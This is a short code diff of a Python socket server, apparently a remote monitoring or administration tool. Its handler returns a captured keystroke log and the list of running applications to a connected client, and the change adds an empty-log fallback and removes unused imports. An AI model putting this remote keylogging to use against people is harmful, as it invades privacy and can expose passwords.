@@ -9,8 +9,6 @@ import socket
 from PyQt5.QtWidgets import QApplication
 from multiprocessing import Process
 import serverfunc
-import pickle
-from pynput.keyboard import Listener, Key
 
 
 serverThread = None
@@ -81,7 +79,11 @@ def connectclient(conn):
             serverfunc.listening_keyboard(False)
         if data == "get_key_log":
             result = serverfunc.get_key_log()
-            conn.send(bytes(result, "utf-8"))
+
+            if result:
+                conn.send(bytes(result, "utf-8"))
+            else:
+                conn.send(bytes("None", "utf-8"))
         if data == "get_application_running":
             data_application = serverfunc.get_application_running()
             conn.sendall(bytes(str(data_application), "utf-8"))
